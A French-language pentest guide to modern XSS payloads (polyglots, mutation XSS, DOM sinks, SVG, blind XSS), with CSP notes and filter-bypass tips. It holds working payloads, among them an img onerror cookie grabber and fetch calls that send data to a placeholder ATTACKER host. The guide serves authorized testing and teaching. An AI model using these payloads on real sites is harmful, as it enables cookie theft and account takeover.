# Modern XSS polyglot & safe PoC

> Rassemble des payloads et techniques XSS modernes (mXSS, SVG, data URIs, DOM sinks) et propose des PoC non‑destructifs et des bonnes pratiques pour les tests.

---

## Avertissement — sécurité

Ce document est à usage pédagogique exclusivement. N'exécutez ces payloads que sur des cibles dont vous avez l'autorisation explicite (ex : `demo-target` fourni avec VulnRadar, environnements de test, cibles auto‑hébergées).

Pour les preuves de concept (PoC), privilégiez des actions non destructrices : `console.log`, `fetch` vers un endpoint contrôlé ou enregistrement dans un log plutôt que `alert()` ou manipulation destructrice.

---

## Polyglots & payloads courts (préférer console.log pour PoC)

- Console PoC (préférable à `alert`):

```html
<script>console.log(document.domain, window.origin)</script>
```

- Img onerror cookie grabber (PoC non‑bloquant vers endpoint contrôlé) :

```html
<img src=x onerror="new Image().src='//ATTACKER/?c='+encodeURIComponent(document.cookie)">
```

- SVG court (exfiltration via fetch) :

```html
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//ATTACKER/?d='+encodeURIComponent(document.domain))"/>
```

- Data URI example :

```text
data:text/html,<script>console.log(document.domain)</script>
```

- Minimal polyglot (fonctionne dans de nombreux contextes) :

```html
"><svg/onload=console.log(document.domain)>
```

---

## Mutation XSS (mXSS)

- Contexte : certaines transformations côté client (ou du moteur de rendu) peuvent "muter" l’entrée et réautoriser l’exécution de code qui semblait inoffensif. C’est souvent observable sur des moteurs HTML modernes.

- PoC safe : utilisez `console.log` pour vérifier l’exécution sans popups :

```html
<noscript><p title="</noscript><img src=x onerror=console.log('mXSS:'+document.domain)>
```

Explication rapide : si un filtre laisse passer des séquences partielles, la mutation peut fermer une balise ou reconstituer un `onerror`/`onload` exécutable.

---

## DOM-based XSS — sinks & PoC sûrs

- innerHTML (danger) — test PoC :

```js
// Danger : exemple de sink
element.innerHTML = '<img src=x onerror=console.log("PoC:"+document.domain)>';
```

- document.write (danger) — test :

```js
document.write('<script>console.log("PoC:"+document.domain)<\/script>');
```

- postMessage mal utilisé — PoC :

```js
parent.postMessage({url:"javascript:console.log(document.domain)"},'*');
```

Remarque : ces PoC utilisent `console.log` au lieu d’`alert` pour réduire le côté intrusif lors de tests.

---

## CSP & défenses modernes

- Une politique CSP bien configurée (`script-src 'nonce-...'` ou `strict-dynamic`) bloque la plupart des scripts inline. Cependant, des vecteurs comme `data:`/`blob:`/SVG peuvent contourner des politiques mal configurées.

- Points d’attention :
  - Vérifier si `unsafe-inline` est présent (très mauvais signe)
  - Rechercher les allowances sur `data:` ou `blob:`
  - Les `script-src` avec `nonce` sont plus sûrs si les nonces sont gérés correctement côté serveur.

---

## SVG / XML specifics

- SVG peut contenir des handlers (`onload`, `onerror`) et `<script>` ; les comportements diffèrent selon les navigateurs (ex. Chrome vs Firefox).
- Exemples de test : utiliser `console.log` dans un `onload` plutôt que `alert`.

---

## Blind XSS — bonnes pratiques

Pour blind XSS, préférez l’exfiltration via `fetch` vers un endpoint contrôlé :

```html
<script>fetch('https://ATTACKER/notify?d='+encodeURIComponent(document.domain))</script>
```

Cela permet de recevoir une notification sans interaction utilisateur.

---

## Bypass & filtres (tips)

- Encodage hex / unicode / insertion de commentaires/newlines pour contourner des filtres basés sur signatures.
- Utiliser des payloads fractionnés pour déclencher des mutations côté client.
- Tester plusieurs user agents et moteurs (Chromium, Firefox, WebKit).

---

## Outils recommandés

- XSStrike, Dalfox, Dalfox (Go), XSSer, Dalfox, domdig — utilisez‑les pour automatiser la détection, mais validez manuellement les PoC.

---

## PoC etiquette (à inclure dans un rapport)

- URL complète + paramètre vulnérable
- Payload utilisé
- Preuve d’exécution (console.log output, requête vers endpoint contrôlé)
- Impact & recommandation de mitigation

---

## Références

- PortSwigger XSS cheat sheet
- Articles et writeups sur mutation XSS (mXSS)
- LiveOverflow / blogs et présentations cités dans la section XSS principale

---

*Rédigé pour compléter la section XSS existante — PoC non‑destructifs et bonnes pratiques pour tests responsables.*
